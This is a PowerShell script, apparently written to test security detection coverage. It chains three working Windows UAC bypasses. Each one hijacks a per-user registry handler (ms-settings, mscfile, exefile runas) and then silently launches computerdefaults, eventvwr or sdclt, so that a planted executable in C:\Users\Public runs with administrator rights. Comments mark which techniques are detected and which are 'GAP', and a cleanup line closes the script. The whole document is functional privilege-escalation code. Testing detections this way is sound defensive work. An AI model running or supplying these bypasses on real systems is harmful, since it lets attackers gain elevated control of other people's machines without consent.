Write-Host "run from a NON-elevated PowerShell"
Write-Host "[1] computerdefaults (ms-settings key - expect PERS-UAC-KEY)..."
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Users\Public\sysupd.exe"
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name DelegateExecute -Value ""
Start-Process C:\Windows\System32\computerdefaults.exe -WindowStyle Hidden
Start-Sleep 3
Write-Host "[2] eventvwr (mscfile key - currently a GAP)..."
New-Item "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Force | Out-Null
Set-ItemProperty "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Name "(default)" -Value "C:\Users\Public\sysupd.exe"
Start-Process C:\Windows\System32\eventvwr.exe -WindowStyle Hidden
Start-Sleep 3
Write-Host "[3] sdclt (exefile key - currently a GAP)..."
New-Item "HKCU:\Software\Classes\exefile\shell\runas\command" -Force | Out-Null
Set-ItemProperty "HKCU:\Software\Classes\exefile\shell\runas\command" -Name IsolatedCommand -Value "C:\Users\Public\sysupd.exe"
Start-Process C:\Windows\System32\sdclt.exe -WindowStyle Hidden
Write-Host "cleanup: Remove-Item -Recurse HKCU:\Software\Classes\ms-settings, HKCU:\Software\Classes\mscfile; Remove-Item HKCU:\Software\Classes\exefile\shell\runas -Recurse"
